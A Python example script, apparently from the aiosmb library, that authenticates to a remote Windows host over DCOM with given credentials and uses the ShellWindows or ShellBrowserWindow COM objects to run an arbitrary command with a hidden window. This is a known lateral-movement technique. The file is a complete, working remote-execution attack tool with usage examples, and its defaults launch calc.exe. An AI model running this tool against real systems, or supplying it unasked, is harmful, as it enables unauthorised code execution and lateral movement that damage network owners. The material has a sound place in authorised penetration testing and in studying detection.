#!/usr/bin/env python3
"""
ShellWindows/ShellBrowserWindow DCOM Command Execution Example

Uses ShellWindows or ShellBrowserWindow COM objects to execute commands via DCOM.

Usage:
    python -m examples.dcom_shellwindows <target> <username> <password> [domain] [command]

Examples:
    # Execute calc.exe via ShellWindows (default)
    python -m examples.dcom_shellwindows 192.168.56.11 admin password
    
    # Execute a specific command
    python -m examples.dcom_shellwindows 192.168.56.11 admin password DOMAIN notepad.exe

Note: ShellWindows requires an existing Explorer shell window on the target.
      ShellBrowserWindow creates its own context.
"""

import asyncio
import sys
import logging

from aiosmb.dcerpc.v5.dcom.connection import DCOMConnection, DCERPCAuth
from aiosmb.dcerpc.v5.dcom.shellwindows import (
    ShellWindows, ShellBrowserWindow,
    CLSID_ShellWindows, CLSID_ShellBrowserWindow,
)
from aiosmb.dcerpc.v5.dcom.oaut import IID_IDispatch


async def shellwindows_exec(target: str, username: str, password: str, 
                            domain: str = '', command: str = 'calc.exe',
                            use_browser: bool = False, debug: bool = False):
    """
    Execute a command via ShellWindows or ShellBrowserWindow DCOM object.
    """
    if debug:
        logging.basicConfig(level=logging.DEBUG)
    
    method = "ShellBrowserWindow" if use_browser else "ShellWindows"
    clsid = CLSID_ShellBrowserWindow if use_browser else CLSID_ShellWindows
    
    print(f"[*] Connecting to {target} via DCOM...")
    
    auth = DCERPCAuth.from_components(
        username=username,
        secret=password,
        domain=domain or ''
    )
    
    dcom = DCOMConnection(target=target, auth=auth, domain=domain)
    
    try:
        _, err = await dcom.connect()
        if err is not None:
            print(f"[-] DCOM connect failed: {err}")
            return False
        
        print(f"[+] DCOM connection established")
        
        # Activate the COM object
        print(f"[*] Activating {method}...")
        iInterface, err = await dcom.CoCreateInstanceEx(
            clsid,
            IID_IDispatch
        )
        if err is not None:
            print(f"[-] CoCreateInstanceEx failed: {err}")
            return False
        
        print(f"[+] {method} activated")
        
        # Create wrapper
        if use_browser:
            shell = ShellBrowserWindow(iInterface)
        else:
            shell = ShellWindows(iInterface)
        
        # Parse command and arguments
        parts = command.split(' ', 1)
        exe = parts[0]
        args = parts[1] if len(parts) > 1 else ''
        
        # Execute command
        print(f"[*] Executing: {exe} {args}")
        result, err = await shell.ShellExecute(
            file=exe,
            args=args,
            directory='C:\\Windows\\System32',
            operation='open',
            show=0  # Hidden
        )
        
        if err is not None:
            print(f"[-] ShellExecute failed: {err}")
            return False
        
        print(f"[+] Command executed successfully!")
        return True
        
    finally:
        await dcom.disconnect()
        print(f"[*] Disconnected")


async def main():
    debug = '--debug' in sys.argv
    use_browser = '--browser' in sys.argv
    args = [a for a in sys.argv[1:] if not a.startswith('--')]
    
    if len(args) < 3:
        print(__doc__)
        print("\nOptions:")
        print("  --browser    Use ShellBrowserWindow instead of ShellWindows")
        print("  --debug      Enable debug logging")
        sys.exit(1)
    
    target = args[0]
    username = args[1]
    password = args[2]
    domain = args[3] if len(args) > 3 else ''
    command = args[4] if len(args) > 4 else 'calc.exe'
    
    success = await shellwindows_exec(target, username, password, domain, command, 
                                       use_browser=use_browser, debug=debug)
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    asyncio.run(main())
